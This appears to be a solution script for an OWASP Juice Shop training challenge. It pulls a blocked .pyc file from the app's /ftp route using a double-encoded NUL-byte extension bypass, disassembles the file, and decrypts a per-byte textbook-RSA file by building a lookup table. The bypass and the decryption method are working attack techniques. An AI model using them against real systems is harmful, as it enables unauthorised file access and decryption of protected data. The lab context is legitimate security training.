#!/usr/bin/env python3
"""
c09-pyc-reverse  -- Juice Shop /ftp/encrypt.pyc: retrieve, disassemble, explain, verify.

Steps
  1. Download /ftp/encrypt.pyc.  The /ftp route whitelists only .md/.pdf, so we use the
     double-encoded NUL trick: "encrypt.pyc%2500.md" -> Express decodes once to
     "encrypt.pyc%00.md" -> still ends in .md (whitelist passes) -> fs layer truncates
     at NUL -> the real encrypt.pyc is opened.
  2. Parse the .pyc header + code object constants WITHOUT executing it, and assert the
     recovered constants match the decompiled source (announcement.md, N, 65537, ...).
  3. Verify the recovered algorithm by re-running it: for every byte value v in 0..255
     compute c = pow(v, e, N) (pure Python 2/3 compatible: ord(chr(v)) == v) and use this
     table to invert announcement_encrypted.md (one ciphertext integer per line).
     If the mapping covers 100% of the ciphertext lines, the disassembly is correct.

Outputs: loot/c9/*.txt  (evidence is written by the writeup, not this script)
"""
import sys, struct, urllib.request, collections

BASE = "http://host.docker.internal:3000"
N = int(
    "145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053"
)
E = 65537

def fetch(path):
    url = f"{BASE}/ftp/{path}"
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.read(), r.status, r.headers.get("Content-Type")

def parse_pyc(data):
    """Load the Python-2.7 code object with xdis (py3 marshal can't read 2.7 marshal)."""
    from xdis.load import load_module
    version, timestamp, magic_int, code, is_pypy, source_size, _sip = load_module("encrypt.pyc")
    return magic_int, version, code

def main():
    print("[1] fetching /ftp/encrypt.pyc (NUL-byte extension bypass)")
    raw, st, ct = fetch("encrypt.pyc%2500.md")
    print(f"    HTTP {st}  {len(raw)} bytes  {ct}")
    open("encrypt.pyc", "wb").write(raw)

    print("[2] parsing pyc without executing it")
    magic, version, code = parse_pyc(raw)
    print(f"    magic=0x{magic:08x} ({magic}) -> {version} bytecode, filename={code.co_filename!r}")
    print(f"    co_consts = {code.co_consts}")
    print(f"    co_names  = {code.co_names}")
    consts = code.co_consts
    assert "announcement.md" in consts and N in consts and E in consts
    assert "announcement_encrypted.md" in consts
    print("    ASSERT OK: constants match decompiled source (announcement.md, N, e=65537, output name)")

    print("[3] verifying semantics: per-character textbook RSA, no padding")
    table = {pow(v, E, N): v for v in range(256)}
    print(f"    precomputed {len(table)} ciphertext->byte mappings")

    ct_lines = [l.strip() for l in fetch("announcement_encrypted.md%2500.md")[0]
                .decode(errors="replace").splitlines() if l.strip()]
    print(f"    ciphertext integers: {len(ct_lines)}")

    out, unknown, hist = [], 0, collections.Counter()
    for line in ct_lines:
        c = int(line)
        if c in table:
            out.append(chr(table[c])); hist[table[c]] += 1
        else:
            out.append("?"); unknown += 1
    pt = "".join(out)
    print(f"    decoded {len(out)} bytes, unknown {unknown} "
          f"({(len(out)-unknown)/len(out)*100:.2f}% coverage)")
    print(f"    distinct plaintext bytes seen: {len(hist)}")

    # Semantic sanity checks that could only hold if the algorithm was understood correctly
    printable = sum(1 for ch in pt if 32 <= ord(ch) < 127 or ch in "\n\r\t")
    print(f"    printable ratio: {printable/len(pt)*100:.2f}%")
    assert unknown == 0, "dictionary inversion failed -> ALGORITHM UNDERSTANDING WRONG"
    assert printable / len(pt) > 0.98, "output is not text -> ALGORITHM UNDERSTANDING WRONG"
    open("announcement_recovered_c09.md", "w").write(pt)
    print("    ASSERT OK: 100% coverage of a printable plaintext => encrypt.py semantics reproduced")
    print("\n--- first 300 chars of recovered plaintext ---")
    print(pt[:300])
    print("--- end ---")
    print("\nRESULT: encrypt.pyc reverses to a 4-line RSA-per-byte script; algorithm reproduced exactly.")

if __name__ == "__main__":
    sys.exit(main())
